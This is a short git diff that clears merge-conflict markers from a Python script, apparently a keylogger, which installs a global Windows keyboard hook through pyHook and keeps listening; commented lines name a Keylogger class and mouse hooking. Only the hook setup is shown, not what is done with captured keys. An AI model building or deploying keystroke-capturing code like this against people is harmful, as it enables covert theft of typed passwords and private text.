@@ -1,4 +1,3 @@
-<<<<<<< HEAD
 from ctypes import byref, create_string_buffer, c_ulong, windll
 from io import StringIO
 import os
@@ -89,7 +88,6 @@ def main():
     hm = pyHook.HookManager()
     hm.KeyDown = onKeyboardEvent
     hm.HookKeyboard()
-<<<<<<< HEAD
     pythoncom.PumpMessages()
 
     # kl = keylogger.Keylogger()
@@ -97,13 +95,11 @@ def main():
     # hm.keyDown = kl.KeyEvent
     # hm.HookKeyboard()
     # pythoncom.PumpMessages()
-=======
 #    hm.MouseAll = onMouseEvent
 #    hm.HookMouse()
     # Enter the loop, and if you do not close it manually, the program will always be listening
     pythoncom.PumpMessages()
 
->>>>>>> 0b995bfb48cdce227fff3bbee7d11c91d7e77791
 if __name__ == "__main__":
     main()
     print("done.")
